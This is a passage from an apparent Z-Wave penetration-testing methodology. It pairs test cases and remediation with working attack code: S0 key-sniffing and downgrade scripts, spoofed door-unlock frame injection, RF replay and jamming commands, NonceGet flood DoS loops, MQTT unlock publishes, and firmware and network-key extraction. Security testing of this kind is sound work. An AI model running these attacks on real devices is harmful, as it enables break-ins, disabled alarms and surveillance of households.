| **Risk** | Device fingerprinting; unencrypted actuator commands |
| **Pass Criteria** | All actuator commands (DOOR_LOCK, SWITCH) use security encapsulation |

---

## 9. Phase 2 — Active Network Discovery

### 9.1 EZ-Wave Active Scanning

```bash
# Active stumbler — transmits probe frames to discover nodes
python ezstumbler.py --active --timeout 60 --homeid 0x1a2b3c4d

# Recon specific node for Command Class enumeration
python ezrecon.py --homeid 0x1a2b3c4d --nodeid 5 --timeout 30

# Expected output:
# [+] NodeID 5: COMMAND_CLASS_DOOR_LOCK (0x62)
# [+] NodeID 5: COMMAND_CLASS_SECURITY_2 (0x9F)
# [+] NodeID 5: COMMAND_CLASS_MANUFACTURER_SPECIFIC (0x72)
# [+] NodeID 5: Manufacturer: Yale | Product: Conexis L1
```

### 9.2 Node Info Frame Analysis

The Node Info Frame (NIF) is **always unencrypted** and reveals:
- All supported Command Classes
- Device role (controller, routing slave, etc.)
- Supported data rates
- Security class capabilities

A device advertising `0x9F` (COMMAND_CLASS_SECURITY_2) in its NIF without proper enforcement is a downgrade target.

### 9.3 Command Class Interrogation (via Z-Wave JS)

```javascript
// Using Z-Wave JS REST API for authorized node interrogation
const axios = require('axios');

async function enumerateNode(nodeId) {
    const response = await axios.get(
        `http://localhost:8091/api/zwave/nodes/${nodeId}`
    );
    console.log('Node capabilities:', response.data);
    console.log('Command Classes:', response.data.commandClasses);
    console.log('Security class:', response.data.securityClasses);
}

enumerateNode(5);
```

### Test Cases — Phase 2

| TC-003 | Active Node Enumeration |
|--------|------------------------|
| **Objective** | Map all NodeIDs and device types in target network |
| **Method** | Active scan using EZ-Wave or authorized Z-Wave controller |
| **Tool** | EZ-Wave `ezstumbler.py -a`, Z-Wave JS API |
| **Expected Finding** | Complete node map with device types |
| **Risk** | Enables targeted attack on highest-value devices |
| **Pass Criteria** | Tester produces complete network map within test window |

| TC-004 | Unencrypted Command Class Enumeration |
|--------|-------------------------------------|
| **Objective** | Identify device capabilities via unencrypted NIF |
| **Method** | Trigger/intercept Node Info Frames |
| **Tool** | EZ-Wave `ezrecon.py`, Z-Wave Zniffer |
| **Expected Finding** | Full CC list including security capabilities |
| **Risk** | Reveals attack surface before any authenticated interaction |
| **Vulnerability** | NIF is defined by spec as unauthenticated — inherent weakness |

---

## 10. Phase 3 — Cryptographic & Key Exchange Attacks

### 10.1 S0 Network Key Interception (CRITICAL)

**Prerequisites:** Target device uses S0 security; attacker must be present during device inclusion (pairing)

**Attack Flow:**
```
1. Attacker positions within RF range of target
2. Legitimate user begins device pairing (inclusion mode)
3. Controller sends "Add Node Start" broadcast
4. Device responds with NIF (unencrypted)
5. Controller sends Security_Commands_Supported_Get (0x98 0x02)
6. Device responds with Security_Commands_Supported_Report
7. *** VULNERABLE EXCHANGE BEGINS ***
8. Controller sends Security_Network_Key_Set encrypted with 0x0000000000000000
9. Device responds with Security_Network_Key_Verify
10. Attacker captures frames 8-9 and decrypts using known key 0x0000000000000000
11. Network key extracted → all future S0 traffic decryptable
```

**Implementation with Scapy-radio:**
```python
# S0 Key Exchange Sniffer
from scapy.all import *
load_contrib('zwave')

S0_DEFAULT_KEY = bytes(16)  # All zeros: 0x00000000000000000000000000000000

def process_frame(pkt):
    if ZWave in pkt:
        if hasattr(pkt, 'cmd_class') and pkt.cmd_class == 0x98:  # S0
            if hasattr(pkt, 'cmd') and pkt.cmd == 0x06:  # Network Key Set
                print("[!] S0 Key Exchange Detected!")
                # Decrypt using hardcoded zero key
                encrypted_data = pkt.data
                # AES-OFB decryption with zero key
                from Crypto.Cipher import AES
                cipher = AES.new(S0_DEFAULT_KEY, AES.MODE_OFB, iv=bytes(16))
                network_key = cipher.decrypt(bytes(encrypted_data))
                print(f"[+] NETWORK KEY: {network_key.hex()}")

sniff(prn=process_frame)
```

**Z-Wave Zniffer for S0 decryption:**
1. Open Z-Wave Zniffer
2. Go to Tools → Network Key → Enter captured network key
3. All subsequent S0 frames automatically decrypted in real-time

### 10.2 Z-Shave — S2→S0 Downgrade Attack

**Discovered by:** Pen Test Partners (Andrew Tierney, Ken Munro) — 2018  
**CVE:** Not formally assigned (proprietary protocol specification weakness)  
**Affected:** All Z-Wave devices supporting both S0 and S2 (~100M+ devices as of 2018)  
**Disclosed At:** Pen Test Partners blog + DEF CON / Hardwear.io

**Attack Flow (3 methods identified):**

**Method 1: NIF Spoofing (Remove COMMAND_CLASS_SECURITY_2)**
```
1. Legitimate user initiates device inclusion
2. Device broadcasts NIF containing 0x9F (COMMAND_CLASS_SECURITY_2)
3. ATTACKER transmits spoofed NIF from device's NodeID WITHOUT 0x9F
4. Controller receives spoofed NIF, believes device is S0-only
5. Controller initiates S0 key exchange (using 0x0000000000000000)
6. Attacker captures and decrypts network key
7. Attacker has permanent access to all device communications
```

**Method 2: KEX Report Manipulation**
```
1. Intercept the KEX_REPORT frame (key capability negotiation)
2. Downgrade requested security class in KEX_REPORT to S0
3. Controller accepts S0 pairing
```

**Method 3: Inclusion Window Timing**
```
1. Jam the S2 KEX frames to cause timeout
2. Controller falls back to S0
```

**Implementation with EZ-Wave:**
```bash
# EZ-Wave S2 Downgrade (ezattack script)
# This requires being within RF range during the exact inclusion window

python ezattack.py --homeid 0x1a2b3c4d --attack downgrade \
  --target-node 5 --listen-timeout 120

# The tool will:
# 1. Monitor for inclusion traffic
# 2. Intercept the NIF
# 3. Retransmit modified NIF without COMMAND_CLASS_SECURITY_2
# 4. Monitor for S0 key exchange
# 5. Extract and display the network key
```

**Mitigation:** Enforce S2-only inclusion (no S0 fallback); alert user loudly when downgrade occurs; use QR code DSK verification for all S2 inclusions.

### 10.3 SmartStart DSK Theft

**Attack:** If an attacker photographs or obtains the 128-bit DSK from the device QR code label, they can:
1. Pre-provision their malicious controller with the DSK
2. When the device is powered on for the first time, the attacker's controller can include it before the legitimate controller

```bash
# Decode QR code to extract DSK
# QR format: ZW:${DSK}${ProductType}${ProductID}${MaxInclusionInterval}${UUID16}
# DSK is the first 128 bits (32 hex characters)

# Using zxing or similar:
zbarimg device_qr_code.jpg
# Output: ZW:12345-67890-... (DSK visible)
```

### Test Cases — Phase 3

| TC-005 | S0 Key Interception During Inclusion |
|--------|-------------------------------------|
| **Objective** | Capture network key during S0 device inclusion |
| **Prerequisites** | S0 device; attacker present during pairing |
| **Method** | Passive sniffing of inclusion traffic; AES decrypt with zero key |
| **Tool** | EZ-Wave, Z-Wave Zniffer, custom Scapy script |
| **Expected Finding** | Network key in plaintext |
| **CVSS Score** | 8.1 (High) — requires physical proximity during pairing |
| **Remediation** | Upgrade to S2; eliminate S0 devices |

| TC-006 | S2→S0 Downgrade Attack (Z-Shave) |
|--------|----------------------------------|
| **Objective** | Force S2-capable device to pair using S0 |
| **Prerequisites** | Active RF injection capability (HackRF One) |
| **Method** | Spoof NIF removing COMMAND_CLASS_SECURITY_2 during inclusion window |
| **Tool** | EZ-Wave ezattack, custom Scapy-radio script |
| **Expected Finding** | Device pairs with S0; network key obtainable |
| **CVSS Score** | 8.3 (High) — requires proximity during specific window |
| **Remediation** | Disable S0 backward compatibility; mandatory DSK verification |

| TC-007 | SmartStart DSK Compromise |
|--------|--------------------------|
| **Objective** | Obtain DSK from physical label or supply chain |
| **Method** | Physical access to device packaging; QR code scan |
| **Tool** | Smartphone camera, QR decoder |
| **Expected Finding** | 128-bit DSK obtained |
| **Risk** | Enables rogue inclusion of device |
| **Remediation** | Protect DSK label; implement secondary out-of-band verification |

---

## 11. Phase 4 — Protocol-Level Attacks

### 11.1 HomeID Cloning / Network Joining

If an attacker obtains a valid HomeID (via sniffing), they can attempt to transmit frames from a spoofed NodeID on that network. The controller will reject unknown NodeIDs, but unrouted broadcast frames and some management frames may be processed.

```bash
# Inject a broadcast command to HomeID 0x1a2b3c4d
./wave-out -p '1a 2b 3c 4d 01 09 00 09 ff 20 01 ff' > broadcast_on.cs8
hackrf_transfer -t broadcast_on.cs8 -f 908420000 -s 2000000 -x 40
# 1a2b3c4d = HomeID
# 01       = Source NodeID (controller)
# 09       = Frame control
# 00       = Sequence number
# 09       = Length
# ff       = Destination (broadcast)
# 20 01 ff = BASIC SET 0xFF (ON)
```

### 11.2 Node Info Frame Spoofing

Broadcast a spoofed NIF from a legitimate NodeID to confuse the controller about device capabilities.

```python
from scapy.all import *
load_contrib('zwave')

# Spoof NIF claiming to be NodeID 5 with different capabilities
spoofed_nif = ZWave(homeid=TARGET_HOMEID, src=5, dst=0xFF) / \
              ZWaveNIF(cmd_class_list=[0x20, 0x25, 0x72])  # Remove SECURITY_2

sendp(spoofed_nif, iface='hackrf0')
```

### 11.3 Routing Table Poisoning

By injecting malformed routing messages, an attacker may be able to alter how messages are routed through the mesh, enabling eavesdropping at specific nodes or isolating devices.

### 11.4 Unencrypted Command Injection

Devices that accept unencrypted commands from within the network (or with improperly enforced security) can be directly controlled:

```python
# Send unencrypted DOOR_LOCK OPERATION SET (unlock) — only works if device doesn't enforce security
door_lock_unlock = ZWave(homeid=TARGET_HOMEID, src=ATTACKER_NODE, dst=LOCK_NODE) / \
                   ZWaveReq(cmd_class=0x62, cmd=0x01, data=[0x00])  # 0x00 = unlock
send(door_lock_unlock)
```

### Test Cases — Phase 4

| TC-008 | Unencrypted Command Injection |
|--------|------------------------------|
| **Objective** | Control actuator without authentication |
| **Method** | Inject BASIC SET or device-specific CC frames without security encapsulation |
| **Tool** | waving-z + HackRF, Scapy-radio |
| **Expected Finding** | Vulnerable: device accepts and executes command |
| **Pass Criteria (secure):** | Device rejects all unencrypted commands; requires S2 Access Control |
| **CVSS Score** | 9.8 (Critical) if successful |

| TC-009 | Broadcast Command Injection |
|--------|----------------------------|
| **Objective** | Send broadcast commands to all network devices |
| **Method** | Craft frames with HomeID and destination 0xFF (broadcast) |
| **Tool** | waving-z + HackRF |
| **Expected Finding** | Devices responding to broadcast without authentication |
| **Remediation** | Enable security for all actuator CCs |

| TC-010 | Command Class Enforcement Testing |
|--------|----------------------------------|
| **Objective** | Verify each Command Class requires appropriate security level |
| **Method** | Send each CC command without/with various security levels; record responses |
| **Tool** | Z-Wave JS API (authorized); custom Scapy scripts |
| **Test Matrix:** | S0/S2-Access/S2-Auth/S2-Unauth/No-Security per CC |
| **Documentation:** | Map actual vs. expected security requirements |

---

## 12. Phase 5 — Replay Attacks

### 12.1 Z-Wave S0 Replay Vulnerability

**Background:** S0 uses AES-128-OFB with nonces to prevent replay. However:
- Nonces must be requested fresh (Nonce Get → Nonce Report flow)
- If nonces are predictable or exhausted, replay windows open
- Early Z-Wave implementations had nonce sequence weaknesses

**S0 Replay Attack:**
```bash
# Step 1: Capture authenticated command (e.g., unlock door)
rtl_sdr -f 908420000 -s 2000000 -g 40 - | ./wave-in -u > capture.log
# Capture legitimate S0 Door Unlock sequence

# Step 2: Identify the S0 encapsulated frame
grep "98 " capture.log    # 0x98 = COMMAND_CLASS_SECURITY

# Step 3: Wait for fresh nonce window (nonces expire after ~10 seconds in spec)
# Step 4: Replay captured frame sequence
cat unlock_sequence.cs8 | hackrf_transfer -t /dev/stdin -f 908420000 -s 2000000
```

**Modern S2 Replay Protection:** S2 uses SPAN (Singlecast Pre-shared Absolute Nonce) — a CTR_DRBG that maintains synchronized state between sender and receiver. Replayed frames are rejected because the receiver's counter advances. However, the CTR_DRBG desynchronization attack (see DoS section) can reset this state.

### 12.2 RF Signal Capture and Replay

Using waving-z for complete signal-level replay (bypasses any frame-level analysis):

```bash
# Capture raw IQ of legitimate unlock sequence
hackrf_transfer -r unlock_raw.cs8 -f 908420000 -s 2000000 -l 32 -g 40
# Press Ctrl+C after capturing unlock command

# Replay raw IQ signal (no demodulation needed — hardware-level replay)
hackrf_transfer -t unlock_raw.cs8 -f 908420000 -s 2000000 -x 40 -R
# -R = repeat transmission
```

**This approach is hardware-layer replay** — it replicates the exact RF waveform without any protocol analysis. It is effective against devices with predictable nonce windows.

### Test Cases — Phase 5

| TC-011 | S0 Frame Replay |
|--------|----------------|
| **Objective** | Replay captured S0 command after nonce expiry |
| **Method** | Capture S0 sequence; wait for nonce expiry; replay |
| **Tool** | waving-z + HackRF One |
| **Expected Finding** | Vulnerable: command executed; Secure: rejected due to nonce mismatch |
| **Pass Criteria:** | Device rejects replayed S0 frames |

| TC-012 | Raw RF Signal Replay |
|--------|---------------------|
| **Objective** | Replay raw IQ signal of legitimate command |
| **Method** | Capture raw IQ; replay without demodulation |
| **Tool** | HackRF One + hackrf_transfer |
| **Expected Finding** | Tests whether signal-level replay triggers device action |
| **Note:** | Highly effective against unencrypted or weak S0 devices |

| TC-013 | S2 Anti-Replay Verification |
|--------|----------------------------|
| **Objective** | Verify S2 SPAN prevents replay attacks |
| **Method** | Capture S2 frame; attempt replay; verify rejection |
| **Tool** | Z-Wave Zniffer + HackRF |
| **Expected Finding** | S2 replay is rejected by SPAN nonce verification |
| **Pass Criteria:** | All replayed S2 frames rejected |

---

## 13. Phase 6 — Denial of Service Attacks

### 13.1 S0 NonceGet Flood Attack

**Discovered by:** Researchers (Arxiv paper: "Crushing the Wave", 2020)  
**Reference:** https://arxiv.org/pdf/2001.08497  
**Affected:** All S0 and S2 networks where S0 NonceGet is accepted by gateway

**Attack Mechanism:**
The Z-Wave spec requires a controller to wait for a NonceReport in response to a NonceGet request. By sending spoofed NonceGet requests (using a legitimate but "failed" NodeID), an attacker can keep the controller perpetually waiting, effectively disabling all Z-Wave communications.

```python
# DoS via NonceGet flooding
from scapy.all import *
load_contrib('zwave')

import time

# Spoof NonceGet from a node that exists but isn't responding
def nonce_flood(homeid, spoofed_node, controller_node):
    while True:
        # Send NonceGet with spoofed source
        pkt = ZWave(homeid=homeid, src=spoofed_node, dst=controller_node) / \
              ZWaveReq(cmd_class=0x98, cmd=0x40)  # Security NonceGet = 0x40
        send(pkt)
        time.sleep(0.5)  # 2 packets per second sufficient for DoS

nonce_flood(TARGET_HOMEID, FAILED_NODE_ID, CONTROLLER_NODE_ID)
```

**Impact:** Gateway stops processing all device events and smartphone app commands. The entire smart home network is disabled for all participants.

**Minimal packet rate:** Only ~2 NonceGet packets every 3 seconds required — extremely efficient DoS.

### 13.2 S2 CTR_DRBG Desynchronization Attack

**Mechanism:** An attacker sends a spoofed NonceGet request for an S2 device. The gateway responds with a NonceReport, reinitializing its CTR_DRBG. The actual device (which didn't send the NonceGet) has a different CTR_DRBG state. All subsequent S2 messages between device and gateway become undecryptable, triggering more NonceReport exchanges, creating a cascade.

```python
# S2 SPAN Desynchronization
def span_desynch(homeid, s2_device_node, controller_node):
    while True:
        # Request S2 nonce from controller, spoofing the S2 device's NodeID
        s2_nonce_get = ZWave(homeid=homeid, src=s2_device_node, dst=controller_node) / \
                       ZWaveReq(cmd_class=0x9F, cmd=0x01)  # Security2 NonceGet
        send(s2_nonce_get)
        time.sleep(1)
```

### 13.3 RF Jamming

Z-Wave sub-1 GHz operation makes it relatively immune to Wi-Fi/Bluetooth interference, but can be targeted with a dedicated jammer:

```bash
# Continuous tone transmission (crude jamming) at Z-Wave frequency
# ONLY ON AUTHORIZED TEST HARDWARE IN SHIELDED ENVIRONMENT
hackrf_transfer -t /dev/zero -f 908420000 -s 2000000 -x 47
# Note: RF jamming is illegal on public frequencies under FCC regulations
# Only perform in shielded RF enclosure (Faraday cage) or authorized RF environment
```

**Legitimate DoS test alternative:** Disconnect power to the Z-Wave controller and verify system response/fallback behavior.

### Test Cases — Phase 6

| TC-014 | S0 NonceGet DoS Flood |
|--------|----------------------|
| **Objective** | Disable Z-Wave gateway via NonceGet spoofing |
| **Method** | Send 2 spoofed NonceGet requests per 3 seconds to controller |
| **Tool** | Custom Python script + HackRF/YARD Stick One |
| **Expected Impact** | Gateway unresponsive to all device commands |
| **CVSS Score** | 7.5 (High) — network-level DoS |
| **Remediation** | Rate limit NonceGet; validate NodeID against node table |

| TC-015 | S2 SPAN Desynchronization |
|--------|--------------------------|
| **Objective** | Prevent S2 device from communicating with controller |
| **Method** | Spoof S2 NonceGet requests for target device |
| **Tool** | Custom Python script + HackRF |
| **Expected Impact** | S2 device isolated from network |
| **Impact Note:** | Could prevent security alarm from reporting to controller |

| TC-016 | Battery Drain Attack |
|--------|---------------------|
| **Objective** | Drain battery of battery-powered Z-Wave device |
| **Method** | Wake device repeatedly via broadcast wakeup frames |
| **Tool** | Custom Scapy-radio script |
| **Expected Impact** | Rapid battery depletion; device goes offline |
| **Remediation** | Rate limiting; wakeup authentication |

---

## 14. Phase 7 — Firmware & OTA Analysis

### 14.1 OTA Firmware Update Security

Z-Wave devices support Over-the-Air (OTA) firmware updates via `COMMAND_CLASS_FIRMWARE_UPDATE_MD` (0x7A).

**Security concerns:**
- Unsigned firmware updates allow malicious firmware installation
- Downgrade attacks to vulnerable firmware versions
- Man-in-the-middle of OTA update channel

**Testing OTA update security:**
```bash
# Step 1: Identify firmware update CC support
python ezrecon.py --homeid 0x1a2b3c4d --nodeid 5 | grep FIRMWARE

# Step 2: Extract legitimate firmware using Binwalk (if firmware binary obtained)
binwalk -e firmware.gbl    # Silicon Labs .gbl format
binwalk -e firmware.hex    # Intel HEX format

# Step 3: Analyze extracted firmware
checksec firmware.bin      # Check for NX, ASLR, stack canaries
firmwalker firmware_dir/   # Scan for credentials, keys, hardcoded values
strings firmware.bin | grep -E "(password|key|secret|0x[0-9a-f]{32})"

# Step 4: Test OTA downgrade
# Use Z-Wave JS or Z-Wave PC Controller to attempt installing older firmware version
```

**Z-Wave GBL firmware format (Silicon Labs):**
```bash
# Verify GBL signature (Silicon Labs ECDSA signed firmware)
# Unsigned: reject
# Signed with known key: verify; look for weak key management

python3 -c "
import struct
with open('firmware.gbl', 'rb') as f:
    header = f.read(8)
    magic = struct.unpack('<I', header[:4])[0]
    print(f'GBL Magic: {hex(magic)}')  # Should be 0xEB17A603
"
```

### 14.2 Physical Firmware Extraction

**Targeting Silicon Labs EFR32 chips (700/800 series):**

```
Chip: EFR32ZG14 / ZGM130 / EFR32ZG23 (800 series)
Debug Interface: SWD (Serial Wire Debug)
JTAG: Available on development boards; disabled on production chips

Tools needed:
- SEGGER J-Link EDU (~$60)
- J-Link Commander or OpenOCD
- Target chip datasheet
```

**J-Link SWD connection:**
```bash
# Using J-Link Commander
JLinkExe -device EFR32ZG14P831 -if SWD -speed 4000
J-Link> connect
J-Link> halt
J-Link> mem 0x00000000 0x00040000   # Read Flash (256KB)
J-Link> savebin firmware_dump.bin 0x00000000 0x00040000
J-Link> exit

# Note: Production devices may have debug lock enabled
# Check: J-Link will report "Secured" if debug access is locked
```

**Debug Lock Testing:**
```bash
# If debug interface is locked:
# 1. Attempt mass erase (will erase firmware but unlock interface)
J-Link> erase    # Erases flash and resets debug lock
# 2. If mass erase is disabled — chip is fully secured
# 3. Advanced: power glitching may bypass lock (highly specialized)
```

### 14.3 NVRAM Network Key Extraction

Z-Wave devices store network keys in non-volatile memory (NVM/Flash). If physical access to the device is obtained:

```bash
# For devices with accessible SPI Flash (external memory):
# Connect CH341A to SPI flash chip
flashrom -p ch341a_spi -r nvram_dump.bin

# Locate Z-Wave network key in dump (look for 16-byte AES key patterns)
python3 -c "
with open('nvram_dump.bin', 'rb') as f:
    data = f.read()
# Z-Wave NVM key storage offset varies by SDK version
# Typically at end of NVM: search for key patterns
for i in range(0, len(data)-16, 1):
    block = data[i:i+16]
    if block != b'\\xff' * 16 and block != b'\\x00' * 16:
        if all(32 <= b <= 126 for b in block):  # Printable
            continue
        print(f'Potential key at 0x{i:06x}: {block.hex()}')
"
```

### Test Cases — Phase 7

| TC-017 | Unsigned OTA Firmware Acceptance |
|--------|----------------------------------|
| **Objective** | Verify device rejects unsigned firmware |
| **Method** | Attempt OTA update with unsigned/modified firmware |
| **Tool** | Z-Wave PC Controller OTA update function; modified .gbl file |
| **Expected Finding** | Secure: rejected; Vulnerable: accepted and flashed |
| **Risk** | Complete device compromise; persistent backdoor |

| TC-018 | Firmware Downgrade Attack |
|--------|--------------------------|
| **Objective** | Install older, vulnerable firmware version |
| **Method** | OTA update with previous firmware version |
| **Expected Finding** | Secure: downgrade rejected; Vulnerable: accepted |
| **Remediation** | Version check enforcement in bootloader |

| TC-019 | Debug Interface Access |
|--------|------------------------|
| **Objective** | Verify debug interface is locked on production devices |
| **Method** | Connect J-Link SWD; attempt memory read |
| **Expected Finding** | Production devices should return "Secured" / read-protect enabled |
| **Pass Criteria:** | Debug access locked; memory read fails |

| TC-020 | Network Key NVRAM Extraction |
|--------|------------------------------|
| **Objective** | Extract network key from physical device |
| **Method** | SPI flash dump; NVRAM analysis |
| **Expected Finding** | Key present in flash (risk: if device stolen) |
| **Remediation** | Hardware security module; PUF (Physical Unclonable Function) for key storage |

---

## 15. Phase 8 — Physical Layer Attacks

### 15.1 RF Fingerprinting

Even without decrypting content, RF fingerprinting can identify device types and behavioral patterns:

```python
# Capture and analyze frame timing patterns
import subprocess
import re

# Parse waving-z output for timing analysis
process = subprocess.Popen(['./wave-in', '-u'], 
                          stdin=subprocess.PIPE,
                          stdout=subprocess.PIPE)

frames = []
while True:
    line = process.stdout.readline().decode()
    if line:
        timestamp = re.search(r'(\d+\.\d+)', line)
        if timestamp:
            frames.append(float(timestamp.group(1)))
    
    # Analyze timing to identify device types
    # Door lock wakeup: typically every 240 seconds
    # Motion sensor: irregular, event-driven
    # Smart plug: high frequency reporting
```

### 15.2 Traffic Analysis (Metadata)

Even with encrypted S2 traffic, metadata analysis reveals:
- Which nodes are active (source/dest NodeIDs in plaintext)
- Communication frequency → device type inference
- Time-of-day patterns → occupancy detection
- Frame length → command type inference

```python
# Traffic metadata analysis
from collections import defaultdict
import time

node_activity = defaultdict(list)

def analyze_metadata(frame):
    """Extract metadata from Z-Wave frame without decryption"""
    timestamp = time.time()
    src_node = frame.src
    dst_node = frame.dst
    frame_len = len(frame)
    is_encrypted = hasattr(frame, 'cmd_class') and \
                  frame.cmd_class in [0x98, 0x9F]
    
    node_activity[src_node].append({
        'time': timestamp,
        'dst': dst_node,
        'size': frame_len,
        'encrypted': is_encrypted
    })
    
    # Occupancy inference: door lock activity between 7-9 AM and 5-7 PM
    hour = time.localtime().tm_hour
    if dst_node == LOCK_NODE and not is_encrypted:
        print(f"[ALERT] Unencrypted door lock command at {hour}:00!")
```

### Test Cases — Phase 8

| TC-021 | Traffic Pattern Analysis |
|--------|--------------------------|
| **Objective** | Infer sensitive information from encrypted traffic metadata |
| **Method** | Capture metadata (NodeID, timing, frame size) over 24-48 hours |
| **Tool** | RTL-SDR + waving-z (passive, no decryption required) |
| **Expected Finding** | Occupancy patterns, device behavioral signatures |
| **Risk:** | Privacy violation; enables informed physical attacks |

| TC-022 | RF Coexistence Testing |
|--------|------------------------|
| **Objective** | Test Z-Wave stability under RF interference (2.4 GHz) |
| **Method** | Operate high-bandwidth Wi-Fi near Z-Wave devices |
| **Expected Finding** | Z-Wave should be largely immune (different band) |
| **Note:** | Sub-1 GHz inherently more robust than 2.4 GHz |

---

## 16. Phase 9 — Gateway & Controller Exploitation

### 16.1 Z/IP Gateway (Z-Wave over IP) Attack Surface

The Z/IP gateway bridges Z-Wave and IP networks. It exposes Z-Wave Command Classes via UDP/DTLS.

```bash
# Z/IP Gateway Discovery
nmap -sU -p 4123 192.168.1.0/24    # UDP port 4123 (Z/IP default)
# or
nmap -p 44123 192.168.1.0/24       # TCP port for some implementations

# Z/IP DTLS handshake test
openssl s_client -connect 192.168.1.100:4123 -dtls1_2
```

### 16.2 Home Automation Hub Web Interface Testing

Most Z-Wave controllers expose web interfaces (Home Assistant, SmartThings, Vera, OpenHAB):

```bash
# Standard web application testing against hub
nikto -h http://192.168.1.X:8123    # Home Assistant
burpsuite                            # Intercept and fuzz API calls

# Home Assistant Z-Wave JS REST API endpoints to test:
# POST /api/zwave_js/node/{node_id}/set_value
# POST /api/zwave_js/network/heal
# DELETE /api/zwave_js/node/{node_id}
# GET  /api/zwave_js/node/{node_id}

# Test for authentication bypass:
curl -H "Authorization: Bearer INVALID_TOKEN" \
  http://192.168.1.X:8123/api/zwave_js/node/5/set_value \
  -d '{"commandClassName":"Door Lock","value":false}'
```

### 16.3 MQTT Attack Surface

Many Z-Wave hubs publish device states to MQTT brokers:

```bash
# Discover unauthenticated MQTT brokers
nmap -p 1883,8883 192.168.1.0/24    # 1883=plain, 8883=TLS

# Subscribe to all Z-Wave topics (unauthenticated broker)
mosquitto_sub -h 192.168.1.X -p 1883 -t "zwave/#" -v

# Publish unauthorized command via MQTT
mosquitto_pub -h 192.168.1.X -p 1883 \
  -t "zwave/nodeID_5/DOOR_LOCK/currentMode/set" \
  -m "Unsecured"
```

### 16.4 Z-Wave JS API Security Testing

```javascript
// Test for authorization on Z-Wave JS REST API
const axios = require('axios');

// Attempt unauthorized value set
try {
    const response = await axios.post(
        'http://localhost:8091/api/zwave/nodes/5/set_value',
        {
            commandClassName: 'Door Lock',
            propertyName: 'currentMode',
            value: 'Unsecured'    // Unlock
        }
        // No authorization header
    );
    console.log('[VULNERABLE] Unauthorized command accepted!');
} catch (e) {
    console.log('[SECURE] Unauthorized command rejected:', e.response.status);
}
```

### Test Cases — Phase 9

| TC-023 | Hub Web Interface Authentication Testing |
|--------|----------------------------------------|
| **Objective** | Test for auth bypass, default credentials, session management |
| **Method** | Standard web app pentest against hub HTTP/HTTPS interface |
| **Tool** | Burp Suite, nikto, OWASP testing methodology |
| **High-Priority Tests:** | Default credentials; auth bypass; CSRF; insecure direct object reference |

| TC-024 | MQTT Broker Authentication |
|--------|---------------------------|
| **Objective** | Test MQTT broker for authentication enforcement |
| **Method** | Attempt unauthenticated connection; subscribe to Z-Wave topics; publish commands |
| **Tool** | mosquitto_sub/pub |
| **Pass Criteria:** | Broker requires client certificate or username/password |

| TC-025 | Z/IP Gateway DTLS Security |
|--------|---------------------------|
| **Objective** | Test DTLS implementation for known vulnerabilities |
| **Method** | TLS/DTLS security assessment |
| **Tool** | testssl.sh, openssl |
| **Check for:** | DTLS 1.0 support; weak ciphers; certificate validation |

| TC-026 | API Privilege Escalation |
|--------|--------------------------|
| **Objective** | Test if lower-privilege API tokens can execute higher-privilege operations |
| **Method** | Obtain limited API token; attempt admin operations |
| **Tool** | Burp Suite, curl |
| **Pass Criteria:** | RBAC properly enforced; token scopes respected |

---

## 17. Phase 10 — Z-Wave Long Range (ZWLR) Testing

### 17.1 ZWLR Overview

Z-Wave Long Range (introduced 2020, mandated for 700/800 series) extends range to 4km+ using:
- OFDM modulation (vs FSK for classic Z-Wave)
- Higher transmit power (up to +20 dBm vs +13 dBm for classic)
- US Channels: 912 MHz (Channel A), 920 MHz (Channel B)
- EU Channels: 864 MHz and 866 MHz (transitioning per 2024B-3, April 2025)
- Star topology (not mesh — devices communicate directly with controller only)
- Supports up to 4,000 nodes per network (vs 232 for classic Z-Wave)

### 17.2 ZWLR Security Considerations

ZWLR uses the same S2 security framework as classic Z-Wave but with additional considerations:
- Greater range means RF interception possible from much farther away
- Star topology means all traffic passes through controller — single point of failure
- Larger node counts increase attack surface

### 17.3 ZWLR Sniffing (Current Limitation)

**Currently, the only supported ZWLR Zniffer solution requires:**
- Silicon Labs WSTK Pro Development Kit
- Simultaneous Ethernet AND USB connection to the WSTK
- A DHCP server/router on the same Ethernet segment

```bash
# ZWLR Zniffer point-to-point setup (no router available)
# 1. Static IP assignment on WSTK via Commander tool:
# Commander → Network Information → Disable DHCP → Set static IP 192.168.1.10

# 2. Set tester laptop static IP 192.168.1.1, subnet 255.255.255.0

# 3. Connect WSTK Ethernet directly to laptop Ethernet port

# 4. Open Z-Wave Zniffer
# 5. Tools → Zniffer Setup → Select ZWLR mode → Enter WSTK IP

# 6. In Zniffer, View → Enable All Frames (for wakeup beams and CRC errors)
```

**Upcoming improvement:** DrZWave blog notes that a USB-only ZWLR Zniffer solution is in development (expected 2024-2025).

### Test Cases — Phase 10

| TC-027 | ZWLR Passive Interception |
|--------|--------------------------|
| **Objective** | Capture ZWLR traffic from extended range |
| **Method** | WSTK Zniffer positioned at maximum range from target |
| **Expected Finding** | Traffic visible at much greater distance than classic Z-Wave |
| **Risk:** | Attacker can passively monitor from greater standoff distance |
| **Remediation:** | S2 encryption mandatory; no unencrypted ZWLR traffic |

| TC-028 | ZWLR S2 Downgrade Testing |
|--------|--------------------------|
| **Objective** | Test if Z-Shave attack applies to ZWLR pairing |
| **Method** | Same NIF spoofing technique during ZWLR device inclusion |
| **Expected Finding** | Downgrade attack applicable if S0 backward compatibility enabled |

| TC-029 | ZWLR Node Exhaustion |
|--------|---------------------|
| **Objective** | Test controller stability with high node counts |
| **Method** | Register large number of test nodes (authorized lab test) |
| **Expected Finding** | Controller performance degradation at node limits |

---

## 18. Test Case Matrix

### Complete Test Case Register

| TC ID | Category | Test Name | Severity | Tool(s) | Auth Required |
|-------|----------|-----------|---------|---------|---------------|
| TC-001 | Recon | Passive HomeID Identification | Info | RTL-SDR, waving-z | None |
| TC-002 | Recon | Unencrypted Traffic Detection | Medium | Zniffer, waving-z | None |
| TC-003 | Discovery | Active Node Enumeration | Low | EZ-Wave, Z-Wave JS | Partial |
| TC-004 | Discovery | CC Enumeration via NIF | Low | EZ-Wave, Zniffer | None |
| TC-005 | Crypto | S0 Key Interception | Critical | Scapy-radio, EZ-Wave | None (proximity only) |
| TC-006 | Crypto | S2→S0 Downgrade (Z-Shave) | High | EZ-Wave, HackRF | None (proximity during pairing) |
| TC-007 | Crypto | SmartStart DSK Theft | High | Camera, QR reader | Physical access |
| TC-008 | Injection | Unencrypted Command Injection | Critical | waving-z, Scapy-radio | None |
| TC-009 | Injection | Broadcast Command Injection | High | waving-z, HackRF | None |
| TC-010 | Protocol | CC Security Enforcement | Medium | Z-Wave JS API | Controller access |
| TC-011 | Replay | S0 Frame Replay | High | waving-z, HackRF | None |
